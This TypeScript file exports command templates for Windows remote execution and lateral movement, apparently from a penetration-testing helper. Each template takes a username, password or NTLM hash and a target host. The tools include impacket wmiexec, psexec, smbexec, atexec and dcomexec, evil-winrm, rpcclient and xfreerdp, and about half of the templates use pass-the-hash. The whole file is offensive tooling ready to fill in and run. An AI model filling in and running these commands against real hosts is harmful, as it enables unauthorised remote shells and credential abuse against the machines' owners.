interface Command {
  template: string;
  authType: "password" | "ntlmHash";
}

const localCommands: Command[] = [
  {
    template: "impacket-wmiexec '{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template: "impacket-psexec '{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template: "impacket-smbexec '{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template: "impacket-smbclient '{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template: "impacket-mssqlclient '{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template: "impacket-dcomexec '{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template: "impacket-atexec '{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "xfreerdp /u:'{username}' /p:'{password}' /v:'{targetHost}' /cert-ignore /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache",
    authType: "password",
  },
  {
    template: "evil-winrm -u '{username}' -p '{password}' -i '{targetHost}'",
    authType: "password",
  },
  {
    template: "rpcclient -U '{username}' --password '{password}' '{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-wmiexec '{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-psexec '{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-smbexec '{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-dcomexec '{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-atexec '{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-smbclient '{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-mssqlclient '{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "xfreerdp /u:'{username}' /pth:'{ntlmHash}' /v:'{targetHost}' /cert-ignore /dynamic-resolution",
    authType: "ntlmHash",
  },
  {
    template: "evil-winrm -u '{username}' -H '{ntlmHash}' -i '{targetHost}'",
    authType: "ntlmHash",
  },
  {
    template: "rpcclient -U '{username}' --pw-nt-hash '{ntlmHash}' '{targetHost}'",
    authType: "ntlmHash",
  },
];

export default localCommands;
